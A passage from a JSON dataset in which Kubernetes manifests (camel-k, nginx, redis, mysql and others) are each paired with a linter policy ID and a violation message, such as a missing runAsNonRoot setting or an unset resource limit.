    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: camel-k-operator\n  labels:\n    app: camel-k\n    camel.apache.org/component: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: camel-k-operator\n  template:\n    metadata:\n      labels:\n        name: camel-k-operator\n        camel.apache.org/component: operator\n        app: camel-k\n    spec:\n      serviceAccountName: camel-k-operator\n      containers:\n      - name: camel-k-operator\n        image: docker.io/apache/camel-k:1.9.0-SNAPSHOT\n        imagePullPolicy: IfNotPresent\n        command:\n        - kamel\n        - operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: camel-k\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 20\n          periodSeconds: 10\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"camel-k-operator\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "2345",
    "manifest_path": "data/manifests/the_stack_sample/sample_0593.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: camel-k-operator\n  labels:\n    app: camel-k\n    camel.apache.org/component: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: camel-k-operator\n  template:\n    metadata:\n      labels:\n        name: camel-k-operator\n        camel.apache.org/component: operator\n        app: camel-k\n    spec:\n      serviceAccountName: camel-k-operator\n      containers:\n      - name: camel-k-operator\n        image: docker.io/apache/camel-k:1.9.0-SNAPSHOT\n        imagePullPolicy: IfNotPresent\n        command:\n        - kamel\n        - operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: camel-k\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 20\n          periodSeconds: 10\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"camel-k-operator\" does not have a read-only root file system"
  },
  {
    "id": "2346",
    "manifest_path": "data/manifests/the_stack_sample/sample_0593.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: camel-k-operator\n  labels:\n    app: camel-k\n    camel.apache.org/component: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: camel-k-operator\n  template:\n    metadata:\n      labels:\n        name: camel-k-operator\n        camel.apache.org/component: operator\n        app: camel-k\n    spec:\n      serviceAccountName: camel-k-operator\n      containers:\n      - name: camel-k-operator\n        image: docker.io/apache/camel-k:1.9.0-SNAPSHOT\n        imagePullPolicy: IfNotPresent\n        command:\n        - kamel\n        - operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: camel-k\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 20\n          periodSeconds: 10\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"camel-k-operator\" not found"
  },
  {
    "id": "2347",
    "manifest_path": "data/manifests/the_stack_sample/sample_0593.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: camel-k-operator\n  labels:\n    app: camel-k\n    camel.apache.org/component: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: camel-k-operator\n  template:\n    metadata:\n      labels:\n        name: camel-k-operator\n        camel.apache.org/component: operator\n        app: camel-k\n    spec:\n      serviceAccountName: camel-k-operator\n      containers:\n      - name: camel-k-operator\n        image: docker.io/apache/camel-k:1.9.0-SNAPSHOT\n        imagePullPolicy: IfNotPresent\n        command:\n        - kamel\n        - operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: camel-k\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 20\n          periodSeconds: 10\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"camel-k-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "2348",
    "manifest_path": "data/manifests/the_stack_sample/sample_0593.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: camel-k-operator\n  labels:\n    app: camel-k\n    camel.apache.org/component: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: camel-k-operator\n  template:\n    metadata:\n      labels:\n        name: camel-k-operator\n        camel.apache.org/component: operator\n        app: camel-k\n    spec:\n      serviceAccountName: camel-k-operator\n      containers:\n      - name: camel-k-operator\n        image: docker.io/apache/camel-k:1.9.0-SNAPSHOT\n        imagePullPolicy: IfNotPresent\n        command:\n        - kamel\n        - operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: camel-k\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 20\n          periodSeconds: 10\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"camel-k-operator\" has cpu request 0"
  },
  {
    "id": "2349",
    "manifest_path": "data/manifests/the_stack_sample/sample_0593.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: camel-k-operator\n  labels:\n    app: camel-k\n    camel.apache.org/component: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: camel-k-operator\n  template:\n    metadata:\n      labels:\n        name: camel-k-operator\n        camel.apache.org/component: operator\n        app: camel-k\n    spec:\n      serviceAccountName: camel-k-operator\n      containers:\n      - name: camel-k-operator\n        image: docker.io/apache/camel-k:1.9.0-SNAPSHOT\n        imagePullPolicy: IfNotPresent\n        command:\n        - kamel\n        - operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: camel-k\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 20\n          periodSeconds: 10\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"camel-k-operator\" has memory limit 0"
  },
  {
    "id": "2350",
    "manifest_path": "data/manifests/the_stack_sample/sample_0594.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2987\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2351",
    "manifest_path": "data/manifests/the_stack_sample/sample_0594.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2987\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2352",
    "manifest_path": "data/manifests/the_stack_sample/sample_0594.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2987\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2353",
    "manifest_path": "data/manifests/the_stack_sample/sample_0594.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2987\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2354",
    "manifest_path": "data/manifests/the_stack_sample/sample_0594.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2987\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2355",
    "manifest_path": "data/manifests/the_stack_sample/sample_0595.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ratingsweb-service\n  namespace: ash-workshop-dev\nspec:\n  selector:\n    app: ratingsweb-pod\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ratingsweb-pod])"
  },
  {
    "id": "2356",
    "manifest_path": "data/manifests/the_stack_sample/sample_0596.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\n  namespace: guestbook\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2357",
    "manifest_path": "data/manifests/the_stack_sample/sample_0596.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\n  namespace: guestbook\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"slave\" does not have a read-only root file system"
  },
  {
    "id": "2358",
    "manifest_path": "data/manifests/the_stack_sample/sample_0596.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\n  namespace: guestbook\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"slave\" is not set to runAsNonRoot"
  },
  {
    "id": "2359",
    "manifest_path": "data/manifests/the_stack_sample/sample_0596.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\n  namespace: guestbook\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"slave\" has memory limit 0"
  },
  {
    "id": "2360",
    "manifest_path": "data/manifests/the_stack_sample/sample_0598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-service\n  namespace: monitoring\n  labels:\n    app: nginx-service\n    prometheus: default\nspec:\n  selector:\n    app: nginx-mon\n  type: ClusterIP\n  ports:\n  - name: web\n    protocol: TCP\n    port: 80\n    targetPort: 80\n  - name: metrics\n    protocol: TCP\n    port: 9113\n    targetPort: 9113\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx-mon])"
  },
  {
    "id": "2361",
    "manifest_path": "data/manifests/the_stack_sample/sample_0599.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lhci-server\nspec:\n  selector:\n    matchLabels:\n      name: lhci-server\n  template:\n    metadata:\n      name: lhci-pod\n      labels:\n        name: lhci-server\n    spec:\n      containers:\n      - name: lhci-server\n        image: docker.io/patrickhulce/lhci-server:0.6.1\n        volumeMounts:\n        - mountPath: /data\n          name: lhci-data-volume\n        ports:\n        - containerPort: 9001\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 9001\n      volumes:\n      - name: lhci-data-volume\n        persistentVolumeClaim:\n          claimName: lhci-data-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lhci-server\" does not have a read-only root file system"
  },
  {
    "id": "2362",
    "manifest_path": "data/manifests/the_stack_sample/sample_0599.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lhci-server\nspec:\n  selector:\n    matchLabels:\n      name: lhci-server\n  template:\n    metadata:\n      name: lhci-pod\n      labels:\n        name: lhci-server\n    spec:\n      containers:\n      - name: lhci-server\n        image: docker.io/patrickhulce/lhci-server:0.6.1\n        volumeMounts:\n        - mountPath: /data\n          name: lhci-data-volume\n        ports:\n        - containerPort: 9001\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 9001\n      volumes:\n      - name: lhci-data-volume\n        persistentVolumeClaim:\n          claimName: lhci-data-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lhci-server\" is not set to runAsNonRoot"
  },
  {
    "id": "2363",
    "manifest_path": "data/manifests/the_stack_sample/sample_0599.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lhci-server\nspec:\n  selector:\n    matchLabels:\n      name: lhci-server\n  template:\n    metadata:\n      name: lhci-pod\n      labels:\n        name: lhci-server\n    spec:\n      containers:\n      - name: lhci-server\n        image: docker.io/patrickhulce/lhci-server:0.6.1\n        volumeMounts:\n        - mountPath: /data\n          name: lhci-data-volume\n        ports:\n        - containerPort: 9001\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 9001\n      volumes:\n      - name: lhci-data-volume\n        persistentVolumeClaim:\n          claimName: lhci-data-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"lhci-server\" has cpu request 0"
  },
  {
    "id": "2364",
    "manifest_path": "data/manifests/the_stack_sample/sample_0599.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lhci-server\nspec:\n  selector:\n    matchLabels:\n      name: lhci-server\n  template:\n    metadata:\n      name: lhci-pod\n      labels:\n        name: lhci-server\n    spec:\n      containers:\n      - name: lhci-server\n        image: docker.io/patrickhulce/lhci-server:0.6.1\n        volumeMounts:\n        - mountPath: /data\n          name: lhci-data-volume\n        ports:\n        - containerPort: 9001\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 9001\n      volumes:\n      - name: lhci-data-volume\n        persistentVolumeClaim:\n          claimName: lhci-data-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"lhci-server\" has memory limit 0"
  },
  {
    "id": "2365",
    "manifest_path": "data/manifests/the_stack_sample/sample_0601.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: still-deployment\n  labels:\n    app: still\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: still\n  template:\n    metadata:\n      labels:\n        app: still\n    spec:\n      containers:\n      - name: still\n        image: hdghg/still:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: kafka-0.kafka-headless.default.svc.cluster.local:9092\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"still\" is using an invalid container image, \"hdghg/still:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2366",
    "manifest_path": "data/manifests/the_stack_sample/sample_0601.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: still-deployment\n  labels:\n    app: still\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: still\n  template:\n    metadata:\n      labels:\n        app: still\n    spec:\n      containers:\n      - name: still\n        image: hdghg/still:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: kafka-0.kafka-headless.default.svc.cluster.local:9092\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"still\" does not have a read-only root file system"
  },
  {
    "id": "2367",
    "manifest_path": "data/manifests/the_stack_sample/sample_0601.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: still-deployment\n  labels:\n    app: still\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: still\n  template:\n    metadata:\n      labels:\n        app: still\n    spec:\n      containers:\n      - name: still\n        image: hdghg/still:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: kafka-0.kafka-headless.default.svc.cluster.local:9092\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"still\" is not set to runAsNonRoot"
  },
  {
    "id": "2368",
    "manifest_path": "data/manifests/the_stack_sample/sample_0601.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: still-deployment\n  labels:\n    app: still\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: still\n  template:\n    metadata:\n      labels:\n        app: still\n    spec:\n      containers:\n      - name: still\n        image: hdghg/still:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: kafka-0.kafka-headless.default.svc.cluster.local:9092\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"still\" has cpu request 0"
  },
  {
    "id": "2369",
    "manifest_path": "data/manifests/the_stack_sample/sample_0601.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: still-deployment\n  labels:\n    app: still\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: still\n  template:\n    metadata:\n      labels:\n        app: still\n    spec:\n      containers:\n      - name: still\n        image: hdghg/still:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: kafka-0.kafka-headless.default.svc.cluster.local:9092\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"still\" has memory limit 0"
  },
  {
    "id": "2370",
    "manifest_path": "data/manifests/the_stack_sample/sample_0602.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rbac-permissions-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: rbac-permissions-operator\n  template:\n    metadata:\n      labels:\n        name: rbac-permissions-operator\n    spec:\n      serviceAccountName: rbac-permissions-operator\n      containers:\n      - name: rbac-permissions-operator\n        image: quay.io/app-sre/rbac-permissions-operator:latest\n        command:\n        - rbac-permissions-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: rbac-permissions-operator\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"rbac-permissions-operator\" is using an invalid container image, \"quay.io/app-sre/rbac-permissions-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2371",
    "manifest_path": "data/manifests/the_stack_sample/sample_0602.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rbac-permissions-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: rbac-permissions-operator\n  template:\n    metadata:\n      labels:\n        name: rbac-permissions-operator\n    spec:\n      serviceAccountName: rbac-permissions-operator\n      containers:\n      - name: rbac-permissions-operator\n        image: quay.io/app-sre/rbac-permissions-operator:latest\n        command:\n        - rbac-permissions-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: rbac-permissions-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rbac-permissions-operator\" does not have a read-only root file system"
  },
  {
    "id": "2372",
    "manifest_path": "data/manifests/the_stack_sample/sample_0602.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rbac-permissions-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: rbac-permissions-operator\n  template:\n    metadata:\n      labels:\n        name: rbac-permissions-operator\n    spec:\n      serviceAccountName: rbac-permissions-operator\n      containers:\n      - name: rbac-permissions-operator\n        image: quay.io/app-sre/rbac-permissions-operator:latest\n        command:\n        - rbac-permissions-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: rbac-permissions-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"rbac-permissions-operator\" not found"
  },
  {
    "id": "2373",
    "manifest_path": "data/manifests/the_stack_sample/sample_0602.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rbac-permissions-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: rbac-permissions-operator\n  template:\n    metadata:\n      labels:\n        name: rbac-permissions-operator\n    spec:\n      serviceAccountName: rbac-permissions-operator\n      containers:\n      - name: rbac-permissions-operator\n        image: quay.io/app-sre/rbac-permissions-operator:latest\n        command:\n        - rbac-permissions-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: rbac-permissions-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rbac-permissions-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "2374",
    "manifest_path": "data/manifests/the_stack_sample/sample_0602.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rbac-permissions-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: rbac-permissions-operator\n  template:\n    metadata:\n      labels:\n        name: rbac-permissions-operator\n    spec:\n      serviceAccountName: rbac-permissions-operator\n      containers:\n      - name: rbac-permissions-operator\n        image: quay.io/app-sre/rbac-permissions-operator:latest\n        command:\n        - rbac-permissions-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: rbac-permissions-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rbac-permissions-operator\" has cpu request 0"
  },
  {
    "id": "2375",
    "manifest_path": "data/manifests/the_stack_sample/sample_0602.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rbac-permissions-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: rbac-permissions-operator\n  template:\n    metadata:\n      labels:\n        name: rbac-permissions-operator\n    spec:\n      serviceAccountName: rbac-permissions-operator\n      containers:\n      - name: rbac-permissions-operator\n        image: quay.io/app-sre/rbac-permissions-operator:latest\n        command:\n        - rbac-permissions-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: rbac-permissions-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rbac-permissions-operator\" has memory limit 0"
  },
  {
    "id": "2376",
    "manifest_path": "data/manifests/the_stack_sample/sample_0603.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\n  labels:\n    tier: backend\n    app: nginx\nspec:\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n    nodePort: 32380\n  selector:\n    tier: backend\n    app: nginx\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx tier:backend])"
  },
  {
    "id": "2377",
    "manifest_path": "data/manifests/the_stack_sample/sample_0607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\n  labels:\n    app: python\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: python\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mysql\" is using an invalid container image, \"mysql\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2378",
    "manifest_path": "data/manifests/the_stack_sample/sample_0607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\n  labels:\n    app: python\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: python\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "2379",
    "manifest_path": "data/manifests/the_stack_sample/sample_0607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\n  labels:\n    app: python\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: python\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "2380",
    "manifest_path": "data/manifests/the_stack_sample/sample_0607.yaml",
